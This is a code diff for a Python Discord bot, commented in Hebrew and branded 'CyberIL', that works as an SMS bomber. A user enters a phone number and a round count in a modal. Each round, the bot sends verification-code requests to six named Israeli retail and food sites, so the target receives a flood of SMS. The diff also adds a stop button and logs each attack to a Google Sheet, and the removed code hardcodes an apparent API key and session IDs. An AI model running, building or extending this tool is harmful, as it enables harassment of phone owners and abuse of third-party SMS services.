@@ -4,9 +4,13 @@ from discord.ext import commands
 import os
 import requests
 import asyncio
-import random
+from datetime import datetime
 
 TOKEN = os.getenv('DISCORD_TOKEN')
+GSHEET_URL = os.getenv('GSHEET_URL')
+
+# משתנה לשליטה על עצירת התקיפה
+active_attacks = {}
 
 class MyBot(commands.Bot):
     def __init__(self):
@@ -16,120 +20,95 @@ class MyBot(commands.Bot):
 
     async def setup_hook(self):
         await self.tree.sync()
-        print(f"✅ Synced slash commands for {self.user}")
 
 bot = MyBot()
 
-# --- פונקציות השליחה (API Methods) ---
-
-def send_hamal(phone):
-    url = "https://users-auth.hamal.co.il/auth/send-auth-code"
-    payload = {"value": phone, "type": "phone", "projectId": "1"}
-    try:
-        requests.post(url, json=payload, timeout=5)
-    except: pass
-
-def send_mishloha(phone):
-    url = "https://webapi.mishloha.co.il/api/profile/sendSmsVerificationCodeByPhoneNumber"
-    params = {"uuid": "c049beda-2a99-442c-afa9-db86ea140940", "apiKey": "BA6A19D2-F5BD-4B75-A080-6BD1E2FBEF54", "sessionID": "391a3e0a-91a1-1c96-d37e-23c996a45375", "culture": "he", "apiVersion": "2"}
-    payload = {"phoneNumber": phone}
-    try:
-        requests.post(url, json=payload, params=params, timeout=5)
-    except: pass
-
-def send_dominos(phone):
-    url = "https://api.dominos.co.il/sendOtp"
-    payload = {"otpMethod": "text", "customerId": phone, "language": "he", "requestNum": 8, "Grecaptcha": ""}
-    try:
-        requests.post(url, json=payload, timeout=5)
-    except: pass
-
-def send_atmos(phone):
-    url = "https://api-ns.atmos.co.il/rest/1/auth/sendValidationCode"
-    payload = {"restaurant_id": 1, "phone": phone, "testing": False}
-    try:
-        requests.post(url, json=payload, timeout=5)
-    except: pass
-
-def send_castro(phone):
-    url = "https://www.castro.com/customer/ajax/post/"
-    # שים לב: קסטרו משתמשים ב-Form Data ולא ב-JSON
+# --- פונקציית הלוג לגיליון שלך ---
+def log_to_gsheet(user_tag, user_id, target_phone, rounds, success, failed):
+    if not GSHEET_URL: return
+    
+    now = datetime.now().strftime("%d/%m/%Y, %H:%M:%S")
     payload = {
-        "type": "login",
-        "telephone": phone,
-        "bot_validation": "1"
+        "timestamp": now,
+        "type": "sms-bomb", # הסוג החדש שהוספנו
+        "target": target_phone,
+        "mod": user_tag,
+        "userId": str(user_id),
+        "reason": f"הפצצת SMS ({rounds} סיבובים)",
+        "description": f"הצלחות: {success} | נכשלו: {failed}",
+        "guild": "CyberIL"
     }
     try:
-        requests.post(url, data=payload, timeout=5)
-    except: pass
+        requests.post(GSHEET_URL, json=payload, timeout=5)
+    except Exception as e:
+        print(f"Error logging to GSheet: {e}")
 
-def send_renuar(phone):
-    url = "https://oidc.quick-login.com/authorize"
-    # ניקוי המקפים אם יש
-    clean_phone = phone.replace("-", "")
-    payload = {
-        "client_id": "quicklogin-renuar-shop",
-        "country_code": "+972",
-        "phone_local": clean_phone[1:], # מוריד את ה-0 מההתחלה
-        "phone_number": "+972" + clean_phone[1:],
-        "lang": "he"
-    }
+# --- פונקציות ה-API (מקוצרות ליעילות) ---
+def call_api(url, payload, is_json=True):
     try:
-        requests.post(url, data=payload, timeout=5)
-    except: pass
+        headers = {"User-Agent": "Mozilla/5.0"}
+        if is_json:
+            res = requests.post(url, json=payload, headers=headers, timeout=4)
+        else:
+            res = requests.post(url, data=payload, headers=headers, timeout=4)
+        return res.status_code in [200, 201]
+    except: return False
 
-# --- לוגיקת המטח המהיר ---
-async def start_fast_bombing(phone, amount):
-    amount_int = int(amount)
-    for i in range(amount_int):
-        # ירייה מכל 6 המקורות בו-זמנית!
-        tasks = [
-            asyncio.to_thread(send_hamal, phone),
-            asyncio.to_thread(send_mishloha, phone),
-            asyncio.to_thread(send_dominos, phone),
-            asyncio.to_thread(send_atmos, phone),
-            asyncio.to_thread(send_castro, phone),
-            asyncio.to_thread(send_renuar, phone)
-        ]
+async def fire_all(phone):
+    tasks = [
+        asyncio.to_thread(call_api, "https://users-auth.hamal.co.il/auth/send-auth-code", {"value": phone, "type": "phone", "projectId": "1"}),
+        asyncio.to_thread(call_api, "https://webapi.mishloha.co.il/api/profile/sendSmsVerificationCodeByPhoneNumber", {"phoneNumber": phone}),
+        asyncio.to_thread(call_api, "https://api.dominos.co.il/sendOtp", {"otpMethod": "text", "customerId": phone, "language": "he", "requestNum": 8, "Grecaptcha": ""}),
+        asyncio.to_thread(call_api, "https://api-ns.atmos.co.il/rest/1/auth/sendValidationCode", {"restaurant_id": 1, "phone": phone, "testing": False}),
+        asyncio.to_thread(call_api, "https://www.castro.com/customer/ajax/post/", {"type": "login", "telephone": phone, "bot_validation": "1"}, False),
+        asyncio.to_thread(call_api, "https://oidc.quick-login.com/authorize", {"client_id": "quicklogin-renuar-shop", "phone_number": "+972" + phone[1:], "lang": "he"}, False)
+    ]
+    results = await asyncio.gather(*tasks)
+    return sum(results), len(results) - sum(results)
+
+# --- לוגיקת התקיפה ---
+async def run_attack(interaction, phone, rounds):
+    user_id = interaction.user.id
+    user_tag = interaction.user.name
+    active_attacks[user_id] = True
+    
+    s_total, f_total = 0, 0
+    
+    for i in range(int(rounds)):
+        if not active_attacks.get(user_id): break
         
-        await asyncio.gather(*tasks)
-        print(f"🚀 Burst {i+1}/{amount_int} | 6 SMS Sent")
-        
-        # המתנה קצרה כדי לא להיחסם
+        s, f = await fire_all(phone)
+        s_total += s
+        f_total += f
         await asyncio.sleep(2)
+    
+    # שליחת הלוג בסיום
+    log_to_gsheet(user_tag, user_id, phone, rounds, s_total, f_total)
+    active_attacks.pop(user_id, None)
 
 # --- ממשק דיסקורד ---
-class SpamModal(discord.ui.Modal, title='CyberIL Hexa-Source Bomber'):
-    phone = discord.ui.TextInput(label='Phone Number', placeholder='05XXXXXXXX', min_length=10, max_length=10)
-    amount = discord.ui.TextInput(label='Rounds (6 SMS per round)', placeholder='1-100', default='10')
-
-    async def on_submit(self, interaction: discord.Interaction):
-        await interaction.response.send_message(
-            f"⚡ **Hexa-Attack Initialized!**\nTarget: {self.phone.value}\nSources: 6 Different Sites\nCheck Railway logs for live impact.", 
-            ephemeral=True
-        )
-        asyncio.create_task(start_fast_bombing(self.phone.value, self.amount.value))
-
-class ControlPanelView(discord.ui.View):
+class AttackView(discord.ui.View):
     def __init__(self):
         super().__init__(timeout=None)
 
-    @discord.ui.button(label="🚀 Launch Hexa Attack", style=discord.ButtonStyle.danger, custom_id="fast_btn")
-    async def fast_button(self, interaction: discord.Interaction, button: discord.ui.Button):
-        await interaction.response.send_modal(SpamModal())
+    @discord.ui.button(label="🚀 Launch", style=discord.ButtonStyle.danger)
+    async def launch(self, interaction: discord.Interaction, button: discord.ui.Button):
+        class BombModal(discord.ui.Modal, title="SMS Bomber"):
+            p = discord.ui.TextInput(label="Phone", min_length=10, max_length=10)
+            r = discord.ui.TextInput(label="Rounds", default="10")
+            async def on_submit(self, it: discord.Interaction):
+                await it.response.send_message(f"Bombing {self.p.value}...", ephemeral=True)
+                asyncio.create_task(run_attack(it, self.p.value, self.r.value))
+        await interaction.response.send_modal(BombModal())
 
-@bot.tree.command(name="setup", description="מפעיל את הפאנל")
+    @discord.ui.button(label="🛑 STOP", style=discord.ButtonStyle.grey)
+    async def stop(self, interaction: discord.Interaction, button: discord.ui.Button):
+        active_attacks[interaction.user.id] = False
+        await interaction.response.send_message("Stopping your attack...", ephemeral=True)
+
+@bot.tree.command(name="setup")
 async def setup(interaction: discord.Interaction):
-    embed = discord.Embed(
-        title="⚡ CyberIL High-Speed Bomber",
-        description="**System:** Online\n**Mode:** Hexa-Source\n**Active Sources:** 6",
-        color=discord.Color.dark_red()
-    )
-    embed.set_footer(text="Developed by Asaf Dev Studio")
-    await interaction.response.send_message(embed=embed, view=ControlPanelView())
-
-@bot.event
-async def on_ready():
-    print(f'🤖 Spamer is HEXA-LOADED!')
+    embed = discord.Embed(title="⚡ CyberIL SMS Control", color=0x00ff00)
+    await interaction.response.send_message(embed=embed, view=AttackView())
 
 bot.run(TOKEN)
